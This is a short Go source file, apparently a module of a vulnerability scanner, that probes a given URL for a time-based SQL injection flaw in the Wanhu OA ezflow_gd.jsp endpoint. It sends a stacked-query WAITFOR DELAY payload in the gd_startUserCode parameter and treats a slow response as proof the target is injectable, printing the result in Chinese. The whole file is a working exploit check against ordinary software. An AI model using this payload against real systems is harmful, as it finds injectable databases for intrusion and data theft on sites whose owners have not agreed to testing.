package wanhu_defaultroot_sqljni

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(8 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/defaultroot/platform/bpm/ezflow/operation/ezflow_gd.jsp;?gd=1&gd_startUserCode=1%27%3B%20WAITFOR%20DELAY%20%270:0:5%27--"
	startTime := time.Now()
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).
		Get(vulnUrl)
	responseTime := time.Since(startTime)

	if err == nil && resp.StatusCode == 200 && responseTime > 5*time.Second {
		return true
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		cheurl := url + "/defaultroot/platform/bpm/ezflow/operation/ezflow_gd.jsp;?gd=1&gd_startUserCode=1%27%3B%20WAITFOR%20DELAY%20%270:0:3%27--"
		color.Green.Println("[+11] 万户OA SQL注入漏洞存在 -> ", cheurl)
	} else {
		color.Red.Println("[+11] 万户OA SQL注入漏洞不存在")
	}
}
